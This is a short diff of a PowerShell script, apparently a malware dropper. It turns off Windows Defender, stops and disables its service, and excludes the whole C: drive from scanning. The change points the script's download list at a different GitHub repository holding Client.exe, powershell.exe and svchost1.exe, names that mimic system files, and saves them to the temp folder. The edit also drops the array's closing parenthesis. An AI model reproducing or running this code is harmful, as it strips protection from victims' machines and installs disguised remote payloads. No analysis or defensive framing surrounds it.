@@ -8,12 +8,10 @@ Set-MpPreference -DisableIOAVProtection $true -Force
 Stop-Service -Name WinDefend -Force
 Set-Service -Name WinDefend -StartupType Disabled
 Add-MpPreference -ExclusionPath "C:\" -Force
-
 $urls = @(
-    "https://github.com/sys1e/cmd/raw/refs/heads/main/Client.exe",
-    "https://github.com/sys1e/cmd/raw/refs/heads/main/powershell.exe",
-    "https://github.com/sys1e/cmd/raw/refs/heads/main/svchost1.exe"
-)
+    "https://github.com/sys1e/catl/raw/refs/heads/main/Client.exe",
+    "https://github.com/sys1e/catl/raw/refs/heads/main/powershell.exe",
+    "https://github.com/sys1e/catl/raw/refs/heads/main/svchost1.exe"
 foreach ($url in $urls) {
     $fileName = $url.Split("/")[-1]
     $path = "$env:TEMP\$fileName"
